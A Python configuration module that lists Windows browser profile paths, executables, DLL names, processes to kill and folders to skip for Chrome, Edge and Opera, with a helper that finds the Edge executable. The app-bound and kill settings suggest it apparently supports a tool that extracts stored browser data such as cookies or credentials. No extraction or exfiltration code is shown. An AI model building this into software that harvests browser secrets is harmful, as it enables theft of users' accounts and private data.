import os
from pathlib import Path

LO = os.environ.get("LOCALAPPDATA", "")
PF = os.environ.get("PROGRAMFILES", "")
PF86 = os.environ.get("PROGRAMFILES(X86)", "")
AP = os.environ.get("APPDATA", "")

BROWSERS = {
    "chrome": {
        "edge": False,
        "app_bound": True,
        "data": Path(LO) / "Google/Chrome/User Data",
        "exe": [Path(PF) / "Google/Chrome/Application/chrome.exe",
                Path(LO) / "Google/Chrome/Application/chrome.exe"],
        "dlls": ["chrome.dll"],
        "kill": ["chrome.exe"],
        "args": ["--profile-directory=Default", "about:blank"],
    },
    "edge": {
        "edge": True,
        "app_bound": True,
        "data": Path(LO) / "Microsoft/Edge/User Data",
        "exe": [],
        "dlls": ["msedge.dll"],
        "kill": ["msedge.exe", "MicrosoftEdge.exe"],
        "args": ["--profile-directory=Default", "about:blank"],
    },
    "opera": {
        "edge": False,
        "app_bound": False,
        "data": Path(AP) / "Opera Software/Opera Stable",
        "exe": [],
        "dlls": [],
        "kill": ["opera.exe"],
        "args": [],
    },
    "opera_gx": {
        "edge": False,
        "app_bound": False,
        "data": Path(AP) / "Opera Software/Opera GX Stable",
        "exe": [],
        "dlls": [],
        "kill": ["opera.exe"],
        "args": [],
    },
}

SKIP = {
    "BrowserMetrics", "Crashpad", "GrShaderCache", "ShaderCache",
    "WidevineCdm", "SwReporter", "PepperFlash", "FileTypePolicies",
    "OriginTrials", "hyphen-data", "MEIPreload", "Floc",
    "OnDeviceHeadSuggestModel", "SafetyTips", "SSLErrorAssistant",
    "TrustTokenKeyCommitments", "CertificateRevocation",
    "CertificateTransparency", "TLSDeprecationConfig", "EVWhitelist",
    "subresource_filter", "pnacl", "Crowd Deny",
    "InterventionPolicyDatabase", "OptimizationHints",
    "NativeMessagingHosts", "GraphiteDawnCache", "PKIMetadata",
    "ZxcvbnData", "crowd_deny", "SmartScreenLibrary",
}


def find_edge_exe():
    for base in (Path(PF) / "Microsoft/Edge/Application",
                 Path(PF86) / "Microsoft/Edge/Application",
                 Path(LO) / "Microsoft/Edge/Application"):
        if not base.exists():
            continue
        direct = base / "msedge.exe"
        if direct.exists():
            return str(direct)
        for v in sorted(base.iterdir(), reverse=True):
            exe = v / "msedge.exe"
            if exe.exists():
                return str(exe)
    return None